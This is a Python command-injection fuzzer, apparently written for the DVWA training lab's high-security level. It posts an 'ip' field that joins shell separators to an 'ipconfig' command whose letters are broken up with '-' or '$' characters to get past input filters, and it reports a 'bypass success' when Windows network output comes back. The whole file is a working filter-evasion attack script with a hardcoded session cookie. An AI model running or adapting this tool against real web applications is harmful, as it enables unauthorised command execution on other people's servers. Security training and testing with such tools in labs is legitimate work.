import requests
import optparse
import re


def main():
    parser=optparse.OptionParser()
    parser.add_option('-u',dest='zru',help='Used for fuzzy testing')
    (options,args)=parser.parse_args()
    if options.zru:
        url=options.zru
        fuzz(url)
    else:
        parser.print_help()
        exit()

def fuzz(url):
    cookies='PHPSESSID=70mpunbrle3mb6bfaiqieqf3p3;security=high'
    cookie = {}
    for k in str(cookies).strip().split(';'):
        key, value = k.split('=', 1)
        cookie[key] = value

    urls=url
    headers={'user-aegnt':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
    payload=['|',';','||','&&','&']
    payload_b=['-','$']
    payload_c=['-']
    payload_d=['$']
    for p in payload:
        for pb in payload_b:
            for pc in payload_c:
                for pd in payload_d:
                    pf=pc+pd
                    datas={'ip':'127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g'.format(p,pb,pb,pb,pb,pb,pb,pb),'Submit':'Submit'}
                    datas2={'ip': '127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g'.format(p, pf, pf, pf, pf, pf, pf, pf),'Submit': 'Submit'}
                    reqt=requests.post(url=urls,headers=headers,cookies=cookie,data=datas)
                    reqt2=requests.post(url=urls,headers=headers,cookies=cookie,data=datas2)
                    if 'Windows IP' in reqt.text:
                        print('[+] Bypass success URL:{} data:{}'.format(reqt.url,datas))
                    if 'Windows IP' in reqt2.text:
                        print('[+] Bypass success URL:{} data:{}'.format(reqt.url, datas))

if __name__ == '__main__':
    main()